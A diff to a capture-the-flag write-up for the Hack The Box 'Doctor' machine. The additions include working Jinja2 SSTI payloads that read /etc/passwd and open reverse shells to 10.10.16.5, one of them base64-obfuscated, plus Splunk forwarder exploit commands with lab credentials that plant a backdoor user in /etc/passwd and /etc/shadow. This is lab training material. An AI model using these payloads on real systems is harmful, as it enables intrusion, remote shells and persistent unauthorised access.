@@ -283,9 +283,9 @@ Content-Type: text/plain
 
 ```
 ## Post-Exploitation
-### SSTI
+### Server Side Template Injection
 
-From the reverse shell output,  we realize that this website is running on Flask framework
+From the reverse shell output,  we realize that this website is running on Flask framework, and so we can be sure that the templates that is probably being used here in Jinja2.
 
 ```
 web@doctor:~$ ls
@@ -297,6 +297,29 @@ web@doctor:~/blog$ ls
 ls
 flaskblog  run.py
 ```
+
+Knowing that the site is likely to be running on Jinja2, we can know that the site is most likely vulnerable to SSTI. Using the payload ```{{7*7}}```, we can test if the site is vulnerable to SSTI. Even though the exploit is not reflected on the site when the user creates a new message, but this payload is being evaluated at the /archive endpoint
+
+![SSTI web](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/ssti_web.png)
+
+![SSTI Archive](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/ssti_archive.png)
+
+Using SSTI, we will be able to read remote files with the following payloads.
+
+```
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+
+Using SSTI, we are also able to get a reverse shell using either of the following payloads:
+
+```
+{{config.__class__.__init__.__globals__['os'].popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.5\",4000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'").read()}}
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.5\",4000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'").read()}}{%endif%}{%endfor%}
+
+{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQwMDAgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
+```
+
 ### Splunk Universal Forwarder Agent Exploit
 
 The Splunk Universal Forwarder Agent allows authenticated remote users to send commands/scripts to agents via the Splunk API. Howeverm the Universal Forwarder agent does not validate whether the connections are coming from a valid Splunk Enterprise server, nor does it validate if the code is signed/coming from the valid Splunk Enterprise server. This would mean that any attacker who has valid credentials to the Splunk Universal Forwarder Agent will be able to upload malicious Splunk bundle that can execute code
@@ -317,3 +340,21 @@ sourcetype = test
 Afterwards, we will host the malicious bundle on our local machine, and send a post request to the /services/app/local endpoint with Splunk's authenticated API. Since there is a lack of validation of where the url is coming from, this will allow us to install the malicious bundle on Splunk and the rce will be exploited
 
 ![Exploiting malicious bundle](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/exploitation.png)
+
+
+Apart from that, we can also make use of this exploit to modifying the /etc/passwd and /etc/shadow files
+Firsly, we can use the script to add the user attacker007 to our /etc/passwd file
+```
+python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password "Guitar123" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 10.10.16.5
+```
+
+![/etc/passwd file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/etc_passwd.png)
+
+Next, we will use the script to add the user attacker007 to our /etc/shadow fiile
+
+```
+python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password "Guitar123" --payload "echo 'attacker007:test:18487:0:99999:7:::' >> /etc/shadow" --lhost 10.10.16.5
+```
+
+![/etc/shadow](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/etc_shadow.png)
+```
